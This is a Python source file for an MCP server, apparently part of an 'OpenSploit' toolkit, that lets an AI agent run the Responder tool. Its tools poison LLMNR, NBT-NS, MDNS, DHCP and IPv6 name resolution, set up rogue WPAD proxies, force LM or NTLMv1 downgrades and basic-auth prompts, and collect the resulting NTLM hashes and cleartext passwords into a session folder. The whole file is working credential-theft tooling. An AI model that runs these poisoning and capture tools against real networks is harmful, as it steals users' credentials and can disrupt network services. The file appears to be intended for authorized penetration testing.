#!/usr/bin/env python3
"""
OpenSploit MCP Server: responder
LLMNR/NBT-NS/MDNS poisoning and NTLMv2 hash capture via Responder v3.

Duration-bounded execution: runs Responder for a fixed number of seconds,
then terminates and parses captured hashes from the SQLite DB and log files.
"""

import asyncio
import configparser
import glob
import json
import os
import re
import shutil
import sqlite3
from typing import Any, Dict, List, Optional

from mcp_common.base_server import BaseMCPServer, ToolResult
from mcp_common.output_parsers import sanitize_output

# Responder paths (Kali apt package: responder)
RESPONDER_BIN = "/usr/sbin/responder"
RESPONDER_DIR = "/usr/share/responder"
RESPONDER_CONF = os.path.join(RESPONDER_DIR, "Responder.conf")
RESPONDER_LOGS = os.path.join(RESPONDER_DIR, "logs")
RESPONDER_DB = os.path.join(RESPONDER_DIR, "Responder.db")

SESSION_DIR = "/session"

# Max duration: leave 60s headroom within the 600s tool timeout for cleanup
MAX_DURATION = 540

# ANSI color code stripper (from Responder's utils.py)
ANSI_RE = re.compile(r'\x1b\[([0-9,A-Z]{1,2}(;[0-9]{1,2})?(;[0-9]{3})?)?[m|K]?')

# Pattern to detect port binding errors in Responder output
PORT_BIND_ERROR_RE = re.compile(
    r'\[!\]\s*Error starting (?:TCP|UDP) server on port (\d+)',
)


class ResponderServer(BaseMCPServer):
    def __init__(self):
        super().__init__(
            name="responder",
            description="LLMNR/NBT-NS/MDNS poisoning and NTLMv2 hash capture",
            version="1.0.0",
        )

        self.register_method(
            name="poison",
            description="Run Responder in full poisoning mode — LLMNR/NBT-NS/MDNS poisoning with NTLMv2 hash capture",
            params=self._poison_params(),
            handler=self.poison,
        )

        self.register_method(
            name="analyze",
            description="Passive analysis — observe broadcast name resolution traffic without poisoning",
            params=self._analyze_params(),
            handler=self.analyze,
        )

        self.register_method(
            name="capture_smb",
            description="SMB-only hash capture — no poisoning, for SSRF-triggered NTLMv2 authentication capture",
            params=self._capture_params(),
            handler=self.capture_smb,
        )

    # ── Parameter Helpers ──────────────────────────────────

    def _common_params(self) -> Dict[str, Dict[str, Any]]:
        return {
            "interface": {
                "type": "string",
                "description": "Network interface to listen on (e.g., 'eth0', 'tun0'). If omitted, auto-detects the first non-loopback interface with an IPv4 address via 'ip -j addr'.",
            },
            "duration": {
                "type": "integer",
                "required": True,
                "description": "How long to run Responder in seconds. After this duration, the process is terminated and results are returned. Use 15-30s for SSRF capture, 60-300s for network poisoning.",
            },
            "verbose": {
                "type": "boolean",
                "default": True,
                "description": "Enable verbose output (-v). Shows detailed poisoning and capture activity.",
            },
        }

    def _poison_params(self) -> Dict[str, Dict[str, Any]]:
        params = {
            **self._common_params(),
            "wpad": {
                "type": "boolean",
                "default": False,
                "description": "Start rogue WPAD proxy server (-w). Captures proxy authentication from browsers.",
            },
            "force_wpad_auth": {
                "type": "boolean",
                "default": False,
                "description": "Force NTLM/Basic auth on wpad.dat retrieval (-F). May show auth prompt to users.",
            },
            "basic_auth": {
                "type": "boolean",
                "default": False,
                "description": "Return HTTP Basic auth instead of NTLM (-b). Captures cleartext passwords instead of hashes.",
            },
            "lm_downgrade": {
                "type": "boolean",
                "default": False,
                "description": "Force LM hashing downgrade (--lm). Produces weaker but faster-to-crack hashes. Only old Windows clients support this.",
            },
            "disable_ess": {
                "type": "boolean",
                "default": False,
                "description": "Disable Extended Session Security (--disable-ess). Forces NTLMv1 downgrade for easier cracking.",
            },
            "dhcp": {
                "type": "boolean",
                "default": False,
                "description": "Enable DHCPv4 poisoning with WPAD injection (-d). WARNING: may disrupt DHCP on the network.",
            },
            "external_ip": {
                "type": "string",
                "description": "Custom IPv4 address to poison responses with (-e). Defaults to the interface's own IP.",
            },
            "external_ip6": {
                "type": "string",
                "description": "Custom IPv6 address to poison responses with (-6). Use for IPv6-enabled networks.",
            },
            "proxy_auth": {
                "type": "boolean",
                "default": False,
                "description": "Force NTLM/Basic proxy authentication on all HTTP requests (-P). Cannot be combined with wpad (-w).",
            },
            "dhcpv6": {
                "type": "boolean",
                "default": False,
                "description": "Enable DHCPv6 poisoning (--dhcpv6). Responds to DHCPv6 Solicit messages with attacker's DNS server.",
            },
            "rdnss": {
                "type": "boolean",
                "default": False,
                "description": "Enable Router Advertisement RDNSS poisoning (--rdnss). Injects attacker IP as recursive DNS server via IPv6 RAs.",
            },
            "error_code": {
                "type": "boolean",
                "default": False,
                "description": "Return STATUS_LOGON_FAILURE for auth requests (-E). Forces WebDAV clients to re-authenticate for hash capture.",
            },
            "ttl": {
                "type": "integer",
                "description": "Custom TTL for poisoned answers (-t). Controls how long clients cache the poisoned response.",
            },
        }
        return params

    def _analyze_params(self) -> Dict[str, Dict[str, Any]]:
        return self._common_params()

    def _capture_params(self) -> Dict[str, Dict[str, Any]]:
        return self._common_params()

    # ── Duration Validation ────────────────────────────────

    def _validate_duration(self, duration: int) -> Optional[str]:
        """Validate duration, return error message or None if valid."""
        if duration < 5:
            return "Duration must be at least 5 seconds."
        if duration > MAX_DURATION:
            return (
                f"Duration must be at most {MAX_DURATION} seconds "
                f"(tool timeout is 600s, need headroom for cleanup)."
            )
        return None

    # ── Error Classification ──────────────────────────────

    def _classify_responder_error(
        self, raw_output: str, error_msg: str = ""
    ) -> tuple:
        """Classify Responder errors into (error_class, retryable, suggestions).

        Returns (error_class, retryable, suggestions_list).
        """
        combined = f"{error_msg}\n{raw_output}"

        # Port binding failure (most common)
        if "Error starting TCP server on port" in combined or "Error starting UDP server on port" in combined:
            failed_ports = PORT_BIND_ERROR_RE.findall(combined)
            port_list = ", ".join(failed_ports) if failed_ports else "unknown"
            return (
                "config",
                True,
                [
                    f"Port(s) {port_list} already in use or insufficient permissions.",
                    "Ensure --privileged and --network=host are set.",
                    "Check for other services binding to the same ports (netstat -tlnp).",
                ],
            )

        # Permission denied
        if "PermissionError" in combined or "Operation not permitted" in combined:
            return (
                "permission",
                False,
                [
                    "Responder requires privileged mode for raw sockets.",
                    "Run the container with --privileged --network=host.",
                ],
            )

        # Interface not found
        if "not found" in combined and "interface" in combined.lower():
            return (
                "config",
                False,
                [
                    "Specified network interface does not exist.",
                    "Run 'ip link' to list available interfaces.",
                ],
            )

        # Timeout (process killed)
        if "timed out" in combined.lower() or "TimeoutError" in combined:
            return ("timeout", True, ["Increase duration or check network connectivity."])

        return ("unknown", False, [])

    def _detect_port_bind_errors(self, raw_output: str) -> List[int]:
        """Extract failed port numbers from Responder output."""
        return [int(p) for p in PORT_BIND_ERROR_RE.findall(raw_output)]

    # ── Interface Detection ────────────────────────────────

    async def _detect_interface(self) -> Optional[str]:
        """Auto-detect best network interface via ip -j addr (nmap pattern)."""
        try:
            proc = await asyncio.create_subprocess_exec(
                "ip", "-j", "addr",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=10)
            interfaces = json.loads(stdout.decode())
            for iface in interfaces:
                name = iface.get("ifname", "")
                if name == "lo":
                    continue
                addr_info = iface.get("addr_info", [])
                has_ipv4 = any(a.get("family") == "inet" for a in addr_info)
                if has_ipv4:
                    return name
        except Exception:
            pass
        return None

    async def _validate_interface(self, interface: str) -> bool:
        """Check if a network interface exists."""
        try:
            proc = await asyncio.create_subprocess_exec(
                "ip", "link", "show", interface,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            await asyncio.wait_for(proc.communicate(), timeout=5)
            return proc.returncode == 0
        except Exception:
            return False

    # ── Config Manipulation ────────────────────────────────

    def _backup_config(self) -> Optional[str]:
        """Backup Responder.conf, return backup path or None on failure."""
        backup_path = RESPONDER_CONF + ".bak"
        try:
            shutil.copy2(RESPONDER_CONF, backup_path)
            return backup_path
        except OSError as e:
            self.logger.warning(f"Failed to backup Responder.conf: {e}")
            return None

    def _restore_config(self) -> bool:
        """Restore Responder.conf from backup, return success."""
        backup_path = RESPONDER_CONF + ".bak"
        try:
            if os.path.exists(backup_path):
                shutil.copy2(backup_path, RESPONDER_CONF)
                os.remove(backup_path)
                return True
        except OSError as e:
            self.logger.warning(f"Failed to restore Responder.conf: {e}")
        return False

    def _write_smb_only_config(self):
        """Rewrite Responder.conf: disable all poisoners and servers except SMB."""
        config = configparser.ConfigParser()
        config.read(RESPONDER_CONF)

        section = "Responder Core"
        if not config.has_section(section):
            return

        # Disable all poisoners
        for key in ["LLMNR", "NBTNS", "MDNS"]:
            if config.has_option(section, key):
                config.set(section, key, "Off")

        # Disable all servers except SMB
        servers_to_disable = [
            "SQL", "QUIC", "RDP", "Kerberos", "FTP", "POP", "SMTP",
            "IMAP", "HTTP", "HTTPS", "DNS", "LDAP", "DCERPC",
            "WINRM", "SNMP", "MQTT", "MYSQL",
        ]
        for server in servers_to_disable:
            if config.has_option(section, server):
                config.set(section, server, "Off")

        # Ensure SMB stays on
        if config.has_option(section, "SMB"):
            config.set(section, "SMB", "On")

        with open(RESPONDER_CONF, "w") as f:
            config.write(f)

    # ── Hash Parsing ───────────────────────────────────────

    def _parse_hashes_from_db(self) -> List[Dict[str, Any]]:
        """Parse captured hashes from Responder's SQLite database (primary source).

        Uses a 5-second SQLite timeout to handle potential lock contention
        from a recently-terminated Responder process.
        """
        hashes = []
        # DB may be in RESPONDER_DIR or RESPONDER_LOGS
        for db_path in [RESPONDER_DB, os.path.join(RESPONDER_LOGS, "Responder.db")]:
            if not os.path.exists(db_path):
                continue
            conn = None
            try:
                conn = sqlite3.connect(db_path, timeout=5.0)
                conn.row_factory = sqlite3.Row
                # Check if the 'responder' table exists (DB may be empty on first run)
                tables = conn.execute(
                    "SELECT name FROM sqlite_master WHERE type='table' AND name='responder'"
                ).fetchall()
                if not tables:
                    continue
                cursor = conn.execute(
                    "SELECT timestamp, module, type, client, hostname, user, "
                    "cleartext, hash, fullhash FROM responder"
                )
                for row in cursor:
                    entry = {
                        "timestamp": row["timestamp"],
                        "module": row["module"],
                        "hash_type": row["type"],
                        "client_ip": row["client"],
                        "hostname": row["hostname"],
                        "username": row["user"],
                        "hash": row["fullhash"] or row["hash"],
                    }
                    if row["cleartext"]:
                        entry["cleartext"] = row["cleartext"]
                    hashes.append(entry)
                if hashes:
                    return hashes
            except (sqlite3.Error, OSError) as e:
                self.logger.warning(f"Failed to parse hashes from {db_path}: {e}")
                continue
            finally:
                if conn:
                    try:
                        conn.close()
                    except Exception:
                        pass
        return hashes

    def _parse_hashes_from_files(self) -> List[Dict[str, Any]]:
        """Fallback: parse hash files from Responder logs directory."""
        hashes = []
        if not os.path.exists(RESPONDER_LOGS):
            return hashes

        # NTLM hash files: <PROTOCOL>-NTLMv<N>[-SSP]-<IP>.txt
        for filepath in sorted(glob.glob(os.path.join(RESPONDER_LOGS, "*-NTLMv*.txt"))):
            filename = os.path.basename(filepath)
            parts = filename.replace(".txt", "").rsplit("-", 1)
            module_type = parts[0] if parts else "unknown"
            # Split module from hash type: "SMB-NTLMv2" → ("SMB", "NTLMv2")
            mt_parts = module_type.split("-", 1)
            module = mt_parts[0] if mt_parts else "unknown"
            hash_type = mt_parts[1] if len(mt_parts) > 1 else "unknown"

            try:
                with open(filepath, "r") as f:
                    for line in f:
                        line = line.strip()
                        if not line or line.startswith("#"):
                            continue
                        # NTLMv2 format: username::DOMAIN:challenge:ntproofstr:blob
                        username = line.split("::")[0] if "::" in line else "unknown"
                        domain = ""
                        if "::" in line:
                            rest = line.split("::")[1]
                            domain = rest.split(":")[0] if ":" in rest else ""
                        hashes.append({
                            "module": module,
                            "hash_type": hash_type,
                            "username": username,
                            "domain": domain,
                            "hash": line,
                            "source_file": filename,
                        })
            except OSError:
                continue

        # Cleartext files: <PROTOCOL>-ClearText-<IP>.txt
        for filepath in sorted(glob.glob(os.path.join(RESPONDER_LOGS, "*-ClearText-*.txt"))):
            filename = os.path.basename(filepath)
            module = filename.split("-")[0]
            try:
                with open(filepath, "r") as f:
                    for line in f:
                        line = line.strip()
                        if not line:
                            continue
                        user_pass = line.split(":", 1)
                        hashes.append({
                            "module": module,
                            "hash_type": "ClearText",
                            "username": user_pass[0],
                            "cleartext": user_pass[1] if len(user_pass) > 1 else "",
                            "source_file": filename,
                        })
            except OSError:
                continue

        return hashes

    def _parse_analyze_log(self) -> List[str]:
        """Parse the Analyzer-Session.log for detected protocol activity."""
        detections = []
        log_path = os.path.join(RESPONDER_LOGS, "Analyzer-Session.log")
        if not os.path.exists(log_path):
            return detections
        try:
            with open(log_path, "r") as f:
                for line in f:
                    line = line.strip()
                    if line:
                        detections.append(line)
        except OSError:
            pass
        return detections

    def _copy_to_session(self) -> List[str]:
        """Copy hash files, logs, and DB to /session/responder/ for persistence."""
        dest_dir = os.path.join(SESSION_DIR, "responder")
        os.makedirs(dest_dir, exist_ok=True)
        copied = []

        if not os.path.exists(RESPONDER_LOGS):
            return copied

        for pattern in ["*-NTLMv*.txt", "*-ClearText-*.txt", "*-Session.log"]:
            for filepath in glob.glob(os.path.join(RESPONDER_LOGS, pattern)):
                filename = os.path.basename(filepath)
                dest = os.path.join(dest_dir, filename)
                try:
                    shutil.copy2(filepath, dest)
                    copied.append(dest)
                except OSError:
                    continue

        # Copy SQLite DB
        for db_path in [RESPONDER_DB, os.path.join(RESPONDER_LOGS, "Responder.db")]:
            if os.path.exists(db_path):
                try:
                    dest = os.path.join(dest_dir, "Responder.db")
                    shutil.copy2(db_path, dest)
                    copied.append(dest)
                except OSError:
                    pass
                break

        return copied

    # ── Process Execution ──────────────────────────────────

    async def _run_responder(
        self,
        interface: str,
        duration: int,
        analyze: bool = False,
        verbose: bool = True,
        extra_flags: Optional[List[str]] = None,
    ) -> str:
        """Run Responder for a fixed duration, kill, return combined output."""
        cmd = [RESPONDER_BIN, "-I", interface]
        if analyze:
            cmd.append("-A")
        if verbose:
            cmd.append("-v")
        if extra_flags:
            cmd.extend(extra_flags)

        self.logger.info(f"Running command: {' '.join(cmd)} (duration: {duration}s)")

        # PYTHONUNBUFFERED=1 forces Responder (a Python script) to flush stdout
        # immediately. Without this, stdout is fully buffered when piped and all
        # output is lost when the process is killed.
        env = os.environ.copy()
        env["PYTHONUNBUFFERED"] = "1"

        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            env=env,
        )

        # Wait for the duration, then terminate
        await asyncio.sleep(duration)

        # Graceful shutdown: SIGTERM then SIGKILL
        try:
            proc.terminate()
            try:
                await asyncio.wait_for(proc.wait(), timeout=5)
            except asyncio.TimeoutError:
                proc.kill()
                try:
                    await asyncio.wait_for(proc.wait(), timeout=3)
                except asyncio.TimeoutError:
                    pass  # Process stuck — move on
        except ProcessLookupError:
            pass

        # Read any buffered output after process exits
        stdout = b""
        stderr = b""
        if proc.stdout:
            try:
                stdout = await asyncio.wait_for(proc.stdout.read(), timeout=3)
            except (asyncio.TimeoutError, Exception):
                pass
        if proc.stderr:
            try:
                stderr = await asyncio.wait_for(proc.stderr.read(), timeout=3)
            except (asyncio.TimeoutError, Exception):
                pass

        combined = stdout.decode(errors="replace") + stderr.decode(errors="replace")
        # Strip ANSI color codes
        combined = ANSI_RE.sub("", combined)
        return combined

    # ── Resolve Interface ──────────────────────────────────

    async def _resolve_interface(self, interface: Optional[str]) -> str:
        """Resolve interface: validate if given, auto-detect if not.

        Empty string is treated as an invalid interface (not as 'omitted').
        Only None triggers auto-detection.
        """
        if interface is not None:
            if not interface:
                raise ValueError(
                    "Interface name cannot be empty. "
                    "Run 'ip link' to list available interfaces."
                )
            if not await self._validate_interface(interface):
                raise ValueError(
                    f"Interface '{interface}' not found. "
                    "Run 'ip link' to list available interfaces."
                )
            return interface
        detected = await self._detect_interface()
        if not detected:
            raise ValueError(
                "Could not auto-detect network interface. "
                "Specify the 'interface' parameter explicitly."
            )
        return detected

    # ── Methods ────────────────────────────────────────────

    async def poison(
        self,
        duration: int,
        interface: Optional[str] = None,
        verbose: bool = True,
        wpad: bool = False,
        force_wpad_auth: bool = False,
        basic_auth: bool = False,
        lm_downgrade: bool = False,
        disable_ess: bool = False,
        dhcp: bool = False,
        external_ip: Optional[str] = None,
        external_ip6: Optional[str] = None,
        proxy_auth: bool = False,
        dhcpv6: bool = False,
        rdnss: bool = False,
        error_code: bool = False,
        ttl: Optional[int] = None,
    ) -> ToolResult:
        """Full LLMNR/NBT-NS/MDNS poisoning with NTLMv2 hash capture."""
        duration_err = self._validate_duration(duration)
        if duration_err:
            return ToolResult(
                success=False,
                error=duration_err,
                error_class="params",
            )

        try:
            iface = await self._resolve_interface(interface)
        except ValueError as e:
            return ToolResult(
                success=False,
                error=str(e),
                error_class="config",
            )

        extra_flags = []
        if wpad:
            extra_flags.append("-w")
        if force_wpad_auth:
            extra_flags.append("-F")
        if basic_auth:
            extra_flags.append("-b")
        if lm_downgrade:
            extra_flags.append("--lm")
        if disable_ess:
            extra_flags.append("--disable-ess")
        if dhcp:
            extra_flags.append("-d")
        if external_ip:
            extra_flags.extend(["-e", external_ip])
        if external_ip6:
            extra_flags.extend(["-6", external_ip6])
        if proxy_auth:
            extra_flags.append("-P")
        if dhcpv6:
            extra_flags.append("--dhcpv6")
        if rdnss:
            extra_flags.append("--rdnss")
        if error_code:
            extra_flags.append("-E")
        if ttl is not None:
            extra_flags.extend(["-t", str(ttl)])

        try:
            raw = await self._run_responder(
                interface=iface,
                duration=duration,
                analyze=False,
                verbose=verbose,
                extra_flags=extra_flags,
            )

            hashes = self._parse_hashes_from_db()
            if not hashes:
                hashes = self._parse_hashes_from_files()

            copied = self._copy_to_session()

            # Detect port binding errors and include as warnings
            failed_ports = self._detect_port_bind_errors(raw)

            result_data = {
                "method": "poison",
                "interface_used": iface,
                "duration_seconds": duration,
                "captured_hashes": hashes,
                "hash_count": len(hashes),
                "copied_files": copied,
            }
            if failed_ports:
                result_data["failed_ports"] = failed_ports

            # Classify errors from output
            error_class = None
            retryable = False
            suggestions: List[str] = []
            if failed_ports:
                error_class, retryable, suggestions = self._classify_responder_error(raw)

            return ToolResult(
                success=True,
                data=result_data,
                raw_output=sanitize_output(raw),
                error_class=error_class,
                retryable=retryable,
                suggestions=suggestions,
            )
        except Exception as e:
            error_class, retryable, suggestions = self._classify_responder_error("", str(e))
            return ToolResult(
                success=False,
                error=str(e),
                error_class=error_class,
                retryable=retryable,
                suggestions=suggestions,
            )

    async def analyze(
        self,
        duration: int,
        interface: Optional[str] = None,
        verbose: bool = True,
    ) -> ToolResult:
        """Passive analysis — observe broadcast protocols without poisoning."""
        duration_err = self._validate_duration(duration)
        if duration_err:
            return ToolResult(
                success=False,
                error=duration_err,
                error_class="params",
            )

        try:
            iface = await self._resolve_interface(interface)
        except ValueError as e:
            return ToolResult(
                success=False,
                error=str(e),
                error_class="config",
            )

        try:
            raw = await self._run_responder(
                interface=iface,
                duration=duration,
                analyze=True,
                verbose=verbose,
            )

            detections = self._parse_analyze_log()

            return ToolResult(
                success=True,
                data={
                    "method": "analyze",
                    "interface_used": iface,
                    "duration_seconds": duration,
                    "detected_protocols": detections,
                    "detection_count": len(detections),
                },
                raw_output=sanitize_output(raw),
            )
        except Exception as e:
            error_class, retryable, suggestions = self._classify_responder_error("", str(e))
            return ToolResult(
                success=False,
                error=str(e),
                error_class=error_class,
                retryable=retryable,
                suggestions=suggestions,
            )

    async def capture_smb(
        self,
        duration: int,
        interface: Optional[str] = None,
        verbose: bool = True,
    ) -> ToolResult:
        """SMB-only capture — no poisoning, for SSRF-triggered auth."""
        duration_err = self._validate_duration(duration)
        if duration_err:
            return ToolResult(
                success=False,
                error=duration_err,
                error_class="params",
            )

        try:
            iface = await self._resolve_interface(interface)
        except ValueError as e:
            return ToolResult(
                success=False,
                error=str(e),
                error_class="config",
            )

        # Backup config before modifying
        self._backup_config()

        # Rewrite config: disable poisoners and all servers except SMB
        self._write_smb_only_config()

        try:
            raw = await self._run_responder(
                interface=iface,
                duration=duration,
                analyze=False,
                verbose=verbose,
            )

            hashes = self._parse_hashes_from_db()
            if not hashes:
                hashes = self._parse_hashes_from_files()

            copied = self._copy_to_session()

            # Critical: detect if SMB port 445 failed to bind.
            # For capture_smb, SMB is the ONLY server — if it failed, the entire
            # capture was useless.
            failed_ports = self._detect_port_bind_errors(raw)
            smb_failed = 445 in failed_ports

            if smb_failed and not hashes:
                error_class, retryable, suggestions = self._classify_responder_error(raw)
                return ToolResult(
                    success=False,
                    error=(
                        "SMB server failed to bind to port 445. "
                        "No hashes could be captured. "
                        "Check that --privileged and --network=host are set, "
                        "and no other SMB service is running."
                    ),
                    error_class=error_class or "config",
                    retryable=retryable,
                    suggestions=suggestions or [
                        "Ensure container runs with --privileged --network=host.",
                        "Check for existing SMB services: netstat -tlnp | grep 445.",
                        "Stop any conflicting SMB daemons (smbd, samba).",
                    ],
                    raw_output=sanitize_output(raw),
                )

            result_data = {
                "method": "capture_smb",
                "interface_used": iface,
                "duration_seconds": duration,
                "captured_hashes": hashes,
                "hash_count": len(hashes),
                "smb_only": True,
                "copied_files": copied,
            }
            if failed_ports:
                result_data["failed_ports"] = failed_ports

            return ToolResult(
                success=True,
                data=result_data,
                raw_output=sanitize_output(raw),
            )
        except Exception as e:
            error_class, retryable, suggestions = self._classify_responder_error("", str(e))
            return ToolResult(
                success=False,
                error=str(e),
                error_class=error_class,
                retryable=retryable,
                suggestions=suggestions,
            )
        finally:
            # Always restore config after capture_smb
            self._restore_config()


if __name__ == "__main__":
    ResponderServer.main()
